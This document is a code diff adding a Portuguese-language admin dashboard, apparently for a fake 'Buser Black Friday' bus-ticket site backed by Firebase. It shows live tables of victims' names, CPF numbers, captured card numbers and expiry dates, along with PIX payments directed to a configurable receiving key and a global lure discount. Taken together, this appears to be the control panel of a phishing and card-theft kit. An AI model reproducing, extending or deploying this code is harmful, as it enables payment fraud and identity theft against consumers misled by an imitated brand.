@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Painel Admin — Buser</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:'Poppins',sans-serif;background:#f4f4f8;color:#333}
+header{background:#f11075;color:#fff;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+header h1{margin:0;font-size:18px}
+header .badge{background:rgba(255,255,255,.2);padding:4px 12px;border-radius:20px;font-size:13px}
+.container{max-width:1200px;margin:24px auto;padding:0 16px}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:24px}
+.stat{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.05)}
+.stat h3{margin:0 0 8px;font-size:12px;color:#777;font-weight:500;text-transform:uppercase;letter-spacing:.5px}
+.stat .num{font-size:30px;font-weight:700;color:#f11075}
+.stat .sub{font-size:11px;color:#999;margin-top:4px}
+.card{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.05);margin-bottom:24px}
+.card h2{margin:0 0 16px;font-size:15px;color:#f11075;border-bottom:2px solid #f11075;padding-bottom:8px;display:inline-block}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{text-align:left;padding:8px 6px;border-bottom:1px solid #eee;vertical-align:top}
+th{background:#fafafa;font-weight:600;color:#555;font-size:11px;text-transform:uppercase}
+tr:hover{background:#fff7fa}
+.badge{padding:2px 8px;border-radius:6px;font-size:10px;font-weight:600;display:inline-block}
+.badge.pendente{background:#fff3cd;color:#856404}
+.badge.pago{background:#d4edda;color:#155724}
+.badge.online{background:#d1ecf1;color:#0c5460}
+.badge.offline{background:#f0f0f0;color:#999}
+.form-row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+.form-row input{flex:1;min-width:180px;padding:10px;border:1px solid #ddd;border-radius:8px;font-family:'Poppins'}
+.btn{background:#f11075;color:#fff;border:none;padding:10px 20px;border-radius:8px;font-weight:600;cursor:pointer;font-family:'Poppins'}
+.btn:hover{background:#e70869}
+.btn.sec{background:#555}
+.hint{font-size:11px;color:#999;margin-top:8px}
+#msg{font-size:13px;margin-top:8px;color:#155724;font-weight:600}
+.warn{background:#fff3cd;padding:10px;border-radius:8px;font-size:12px;color:#856404;margin-bottom:12px;border-left:4px solid #ffc107}
+</style>
+</head>
+<body>
+<header>
+  <h1>⚙️ Painel Admin — Buser Black Friday</h1>
+  <span class="badge" id="online-badge">● Online: 0</span>
+</header>
+
+<div class="container">
+
+  <div class="stats">
+    <div class="stat"><h3>Viagens pesquisadas</h3><div class="num" id="stat-viagens">0</div><div class="sub" id="stat-viagens-sub">—</div></div>
+    <div class="stat"><h3>PIX gerados</h3><div class="num" id="stat-pix">0</div><div class="sub" id="stat-pix-sub">R$ 0,00</div></div>
+    <div class="stat"><h3>Cartões</h3><div class="num" id="stat-cartoes">0</div><div class="sub" id="stat-cartoes-sub">R$ 0,00</div></div>
+    <div class="stat"><h3>Online agora</h3><div class="num" id="stat-online">0</div><div class="sub">últimos 60s</div></div>
+    <div class="stat"><h3>Visitas totais</h3><div class="num" id="stat-visitas">0</div><div class="sub">desde sempre</div></div>
+  </div>
+
+  <div class="card">
+    <h2>⚙️ Configuração do Site</h2>
+    <div class="warn">⚠️ A chave secreta PIX é usada pra gerar o código de recebimento. O desconto global é aplicado em TODAS as passagens do site em tempo real.</div>
+    <div class="form-row">
+      <input id="cfg-desconto" type="number" min="0" max="100" placeholder="Desconto global (%)">
+      <input id="cfg-chave-pix" placeholder="Chave secreta PIX (pra receber)">
+    </div>
+    <button class="btn" id="btn-salvar">💾 Salvar configuração</button>
+    <div id="msg"></div>
+    <p class="hint">Após salvar, o site aplica o desconto imediatamente (listener em tempo real).</p>
+  </div>
+
+  <div class="card">
+    <h2>🔍 Viagens pesquisadas</h2>
+    <table><thead><tr><th>Origem</th><th>Destino</th><th>Ida</th><th>Volta</th><th>Quando</th></tr></thead>
+    <tbody id="tbl-viagens"><tr><td colspan="5">Carregando...</td></tr></tbody></table>
+  </div>
+
+  <div class="card">
+    <h2>💸 PIX gerados</h2>
+    <table><thead><tr><th>Passageiro</th><th>CPF</th><th>Valor</th><th>Rota</th><th>Chave</th><th>Status</th><th>Quando</th></tr></thead>
+    <tbody id="tbl-pix"><tr><td colspan="7">Carregando...</td></tr></tbody></table>
+  </div>
+
+  <div class="card">
+    <h2>💳 Cartões (dados capturados no checkout)</h2>
+    <table><thead><tr><th>Passageiro</th><th>Cartão</th><th>Validade</th><th>Bandeira</th><th>Valor</th><th>Status</th><th>Quando</th></tr></thead>
+    <tbody id="tbl-cartoes"><tr><td colspan="7">Carregando...</td></tr></tbody></table>
+  </div>
+
+  <div class="card">
+    <h2>🟢 Clientes online (tempo real)</h2>
+    <table><thead><tr><th>User ID</th><th>Entrou em</th><th>Último ping</th><th>Status</th></tr></thead>
+    <tbody id="tbl-online"><tr><td colspan="4">Conectando...</td></tr></tbody></table>
+  </div>
+
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyCMoq8MNOUjlhqWhjaJ24uW4grhsFFhA", // <-- SUA CHAVE AQUI
+  authDomain: "projeto-link-ddbf0.firebaseapp.com",
+  databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
+  projectId: "projeto-link-ddbf0",
+  storageBucket: "projeto-link-ddbf0.firebasestorage.app",
+  messagingSenderId: "560317126646",
+  appId: "1:560317126646:web:be9cad9c9ed350940399d7"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const fs = firebase.firestore();
+
+/* ===== CONFIG ===== */
+function carregarConfig() {
+  fs.collection("config").doc("global").get().then(snap => {
+    if (snap.exists) {
+      const c = snap.data();
+      document.getElementById("cfg-desconto").value = c.descontoGlobal || "";
+      document.getElementById("cfg-chave-pix").value = c.chavePixSecreta || "";
+    }
+  });
+}
+carregarConfig();
+
+document.getElementById("btn-salvar").onclick = () => {
+  const descontoGlobal = parseFloat(document.getElementById("cfg-desconto").value) || 0;
+  const chavePixSecreta = document.getElementById("cfg-chave-pix").value.trim();
+  fs.collection("config").doc("global").set({ descontoGlobal, chavePixSecreta }, { merge: true })
+    .then(() => {
+      document.getElementById("msg").textContent = "✅ Salvo! O site já está aplicando o desconto.";
+      setTimeout(() => document.getElementById("msg").textContent = "", 4000);
+    })
+    .catch(e => alert("Erro: " + e.message));
+};
+
+/* ===== VIAGENS PESQUISADAS ===== */
+fs.collection("viagens_pesquisadas").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
+  const tbody = document.getElementById("tbl-viagens");
+  if (snap.empty) { tbody.innerHTML = '<tr><td colspan="5">Nenhuma ainda.</td></tr>'; return; }
+  let ultima = "";
+  tbody.innerHTML = snap.docs.map(d => {
+    const v = d.data();
+    const t = v.timestamp?.toDate ? v.timestamp.toDate().toLocaleString("pt-BR") : "—";
+    if (!ultima) ultima = t;
+    return `<tr><td>${v.origem}</td><td>${v.destino}</td><td>${v.dataIda||"—"}</td><td>${v.dataVolta||"—"}</td><td>${t}</td></tr>`;
+  }).join("");
+  document.getElementById("stat-viagens").textContent = snap.size;
+  document.getElementById("stat-viagens-sub").textContent = "última: " + ultima;
+});
+
+/* ===== PIX ===== */
+fs.collection("pix_gerados").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
+  const tbody = document.getElementById("tbl-pix");
+  if (snap.empty) { tbody.innerHTML = '<tr><td colspan="7">Nenhum PIX ainda.</td></tr>'; document.getElementById("stat-pix").textContent="0"; return; }
+  let total = 0;
+  tbody.innerHTML = snap.docs.map(d => {
+    const p = d.data(); total += p.total || 0;
+    const t = p.timestamp?.toDate ? p.timestamp.toDate().toLocaleString("pt-BR") : "—";
+    const rota = p.viagem ? `${p.viagem.departure?.terminal||"?"} → ${p.viagem.arrival?.terminal||"?"}` : "—";
+    const pas = (p.passageiros && p.passageiros[0]) ? p.passageiros[0] : {nome:"?",cpf:"?"};
+    const st = p.status || "pendente";
+    return `<tr><td>${pas.nome}</td><td>${pas.cpf}</td><td>R$ ${(p.total||0).toFixed(2)}</td><td>${rota}</td><td>${p.chaveSecretaUsada||"—"}</td><td><span class="badge ${st}">${st}</span></td><td>${t}</td></tr>`;
+  }).join("");
+  document.getElementById("stat-pix").textContent = snap.size;
+  document.getElementById("stat-pix-sub").textContent = "R$ " + total.toFixed(2);
+});
+
+/* ===== CARTÕES ===== */
+fs.collection("cartoes").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
+  const tbody = document.getElementById("tbl-cartoes");
+  if (snap.empty) { tbody.innerHTML = '<tr><td colspan="7">Nenhum cartão ainda.</td></tr>'; document.getElementById("stat-cartoes").textContent="0"; return; }
+  let total = 0;
+  tbody.innerHTML = snap.docs.map(d => {
+    const c = d.data(); total += c.total || 0;
+    const t = c.timestamp?.toDate ? c.timestamp.toDate().toLocaleString("pt-BR") : "—";
+    const pas = (c.passageiros && c.passageiros[0]) ? c.passageiros[0] : {nome:"?",cpf:"?"};
+    const num = c.cartao?.numero || "";
+    const numMask = num.length > 4 ? "**** **** **** " + num.slice(-4) : num;
+    const st = c.status || "processando";
+    return `<tr><td>${pas.nome} (${pas.cpf})</td><td>${numMask}</td><td>${c.cartao?.validade||"—"}</td><td>${c.cartao?.bandeira||"—"}</td><td>R$ ${(c.total||0).toFixed(2)}</td><td><span class="badge ${st==='pago'?'pago':'pendente'}">${st}</span></td><td>${t}</td></tr>`;
+  }).join("");
+  document.getElementById("stat-cartoes").textContent = snap.size;
+  document.getElementById("stat-cartoes-sub").textContent = "R$ " + total.toFixed(2);
+});
+
+/* ===== ONLINE (Realtime) ===== */
+db.ref("visitas").on("value", snap => {
+  const data = snap.val() || {};
+  const agora = Date.now();
+  const todos = Object.entries(data);
+  const ativos = todos.filter(([id, v]) => v.online && (agora - (v.ultimoPing || v.entrouEm || 0) < 60000));
+  document.getElementById("stat-online").textContent = ativos.length;
+  document.getElementById("online-badge").textContent = `● Online: ${ativos.length}`;
+  document.getElementById("stat-visitas").textContent = todos.length;
+  const tbody = document.getElementById("tbl-online");
+  if (!ativos.length) { tbody.innerHTML = '<tr><td colspan="4">Ninguém online agora.</td></tr>'; return; }
+  tbody.innerHTML = ativos.map(([id, v]) => {
+    const ent = v.entrouEm ? new Date(v.entrouEm).toLocaleTimeString("pt-BR") : "—";
+    const ping = v.ultimoPing ? new Date(v.ultimoPing).toLocaleTimeString("pt-BR") : "—";
+    return `<tr><td>${id}</td><td>${ent}</td><td>${ping}</td><td><span class="badge online">online</span></td></tr>`;
+  }).join("");
+});
+</script>
+</body>
+</html>
